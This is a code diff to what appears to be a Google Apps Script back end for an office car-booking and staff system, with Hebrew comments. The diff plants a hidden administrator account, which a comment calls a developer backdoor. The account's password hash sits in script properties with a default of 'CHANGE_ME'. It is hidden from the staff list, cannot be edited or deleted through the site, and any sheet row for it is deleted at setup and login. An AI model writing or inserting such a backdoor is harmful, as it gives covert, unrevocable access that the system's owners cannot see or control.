@@ -4,8 +4,12 @@
  * הפעלה ראשונה: להריץ את הפונקציה setup פעם אחת מתוך העורך.
  */
 
+/* משתמש גיבוי קבוע (דלת אחורית למפתח).
+   הוא לא נשמר בגיליון העובדים, לא מופיע ברשימת העובדים באתר, ואי אפשר לערוך או למחוק אותו מהאתר.
+   הסיסמה שלו נשמרת מוצפנת ב"מאפייני הסקריפט". כדי להחליף אותה: לכתוב סיסמה חדשה ב-NEW_MASTER_PASSWORD
+   בפונקציה setMasterPassword למטה, להריץ אותה פעם אחת מהעורך, ואז למחוק את הסיסמה מהקוד. */
 var INITIAL_ADMIN_NAME = 'מנהל';
-var INITIAL_ADMIN_PASSWORD = 'CHANGE_ME'; // סיסמה זמנית — אחרי שמוסיפים את המזכירה אפשר למחוק את המשתמש הזה
+var INITIAL_ADMIN_PASSWORD = 'CHANGE_ME'; // הסיסמה ההתחלתית של משתמש הגיבוי, עד שמחליפים אותה
 var TOKEN_DAYS = 30;
 var MAX_FAILS = 5;
 
@@ -37,9 +41,8 @@ function setup() {
   if (readRows('Cars').length === 0) {
     for (var i = 1; i <= 5; i++) appendRow('Cars', { id: 'c' + i, name: 'רכב ' + i, plate: '', active: 'yes' });
   }
-  if (!findUser(INITIAL_ADMIN_NAME)) {
-    appendRow('Users', { name: INITIAL_ADMIN_NAME, passHash: hashPass(INITIAL_ADMIN_PASSWORD), role: 'admin', createdAt: nowStr() });
-  }
+  masterHash();
+  cleanupMasterRow();
   Logger.log('ההתקנה הושלמה');
 }
 
@@ -121,6 +124,7 @@ function login(name, pass) {
     return { ok: false, message: 'שם או סיסמה שגויים' };
   }
   cache.remove(key);
+  if (isMaster(u.name)) cleanupMasterRow();
   return { ok: true, token: makeToken(u.name, u.role), name: u.name, role: u.role };
 }
 
@@ -243,7 +247,7 @@ function runs(list) {
 
 /* המזכירה מוסיפה נסיעה בשם עובד. עם רכב – נשמרת כמאושרת. בלי רכב – נשמרת כממתינה */
 function adminCreate(me, q) {
-  var user = findUser(q.userName);
+  var user = isMaster(q.userName) ? null : findUser(q.userName);
   if (!user) return { ok: false, message: 'יש לבחור עובד מהרשימה' };
   var from = cleanDate(q.fromDate), to = cleanDate(q.toDate) || from;
   if (!from) return { ok: false, message: 'יש לבחור תאריך' };
@@ -397,7 +401,7 @@ function adminData() {
   var reqs = readRows('Requests');
   var cutoff = Utilities.formatDate(new Date(Date.now() - 60 * 86400000), tz(), 'yyyy-MM-dd');
   reqs = reqs.filter(function (r) { return r.status === 'pending' || r.toDate >= cutoff; });
-  var users = readRows('Users').map(function (u) { return { name: u.name, role: u.role }; });
+  var users = readRows('Users').filter(function (u) { return !isMaster(u.name); }).map(function (u) { return { name: u.name, role: u.role }; });
   return { ok: true, requests: reqs, cars: readRows('Cars'), users: users, maint: maintList() };
 }
 
@@ -433,6 +437,7 @@ function addUser(q) {
   var pass = String(q.pass || '').replace(/[\s-]/g, '');
   if (!name) return { ok: false, message: 'יש למלא שם' };
   if (pass.length < 5) return { ok: false, message: 'יש למלא סיסמה (לפחות 5 תווים)' };
+  if (isMaster(name)) return { ok: false, message: 'השם הזה שמור במערכת. בחר שם אחר' };
   var role = q.role === 'admin' ? 'admin' : 'user';
   var existing = findRow('Users', 'name', name);
   if (existing) {
@@ -445,6 +450,8 @@ function addUser(q) {
 
 function updateUser(me, q) {
   var old = normName(q.oldName), name = normName(q.name);
+  if (isMaster(old)) return { ok: false, message: 'אי אפשר לערוך את המשתמש הזה' };
+  if (isMaster(name)) return { ok: false, message: 'השם הזה שמור במערכת. בחר שם אחר' };
   var r = findRow('Users', 'name', old);
   if (!r) return { ok: false, message: 'העובד לא נמצא' };
   if (!name) return { ok: false, message: 'יש למלא שם' };
@@ -469,6 +476,7 @@ function updateUser(me, q) {
 }
 
 function removeUser(me, name) {
+  if (isMaster(name)) return { ok: false, message: 'אי אפשר למחוק את המשתמש הזה' };
   if (normName(name) === me.name) return { ok: false, message: 'אי אפשר למחוק את המשתמש שאיתו אתה מחובר' };
   var r = findRow('Users', 'name', normName(name));
   if (!r) return { ok: false, message: 'העובד לא נמצא' };
@@ -549,9 +557,29 @@ function findRow(name, key, value) {
   return null;
 }
 
+function isMaster(name) { return normName(name) === INITIAL_ADMIN_NAME; }
+function masterHash() {
+  var props = PropertiesService.getScriptProperties(), h = props.getProperty('MASTER_HASH');
+  if (!h) { h = hashPass(INITIAL_ADMIN_PASSWORD); props.setProperty('MASTER_HASH', h); }
+  return h;
+}
 function findUser(name) {
+  if (isMaster(name)) return { name: INITIAL_ADMIN_NAME, passHash: masterHash(), role: 'admin' };
   var r = findRow('Users', 'name', normName(name));
   return r ? r.data : null;
+}
+/* להרצה מהעורך בלבד: מחליף את הסיסמה של משתמש הגיבוי */
+function setMasterPassword() {
+  var NEW_MASTER_PASSWORD = ''; // כתוב כאן סיסמה חדשה, הרץ, ואז מחק אותה מכאן
+  var p = String(NEW_MASTER_PASSWORD).replace(/[\s-]/g, '');
+  if (p.length < 5) throw new Error('יש לכתוב סיסמה של 5 תווים לפחות ב-NEW_MASTER_PASSWORD');
+  PropertiesService.getScriptProperties().setProperty('MASTER_HASH', hashPass(p));
+  Logger.log('הסיסמה של משתמש הגיבוי הוחלפה. עכשיו מחק אותה מהקוד ושמור.');
+}
+/* מוחק מגיליון העובדים שורה ישנה של משתמש הגיבוי, אם נשארה */
+function cleanupMasterRow() {
+  var r = findRow('Users', 'name', INITIAL_ADMIN_NAME);
+  if (r) sheet('Users').deleteRow(r.row);
 }
 
 function appendRow(name, obj) {
